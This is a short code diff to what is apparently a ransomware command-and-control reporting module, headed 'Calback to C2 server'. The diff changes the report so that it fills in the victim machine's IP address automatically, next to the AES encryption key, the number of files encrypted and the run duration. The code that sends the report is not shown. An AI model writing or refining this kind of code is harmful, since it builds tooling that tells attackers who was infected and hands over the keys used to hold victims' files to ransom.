@@ -2,6 +2,7 @@
 Calback to C2 server.
 """
 
+import socket
 from dataclasses import dataclass
 from datetime import datetime, timezone
 from pathlib import Path
@@ -14,7 +15,7 @@ class C2Report:
     ip: str
     file_encrypted: int
     aes_key: str
-    duration: int
+    duration: float
     timestamp: str
 
 
@@ -32,13 +33,12 @@ class C2Integration:
 
     def _to_payload(
         self,
-        ip: str,
         aes_key: str,
         file_encrypted: int,
-        duration: int,
+        duration: float,
     ):
         return C2Report(
-            ip=ip,
+            ip=socket.gethostbyname(socket.gethostname()),
             aes_key=aes_key,
             file_encrypted=file_encrypted,
             duration=duration,
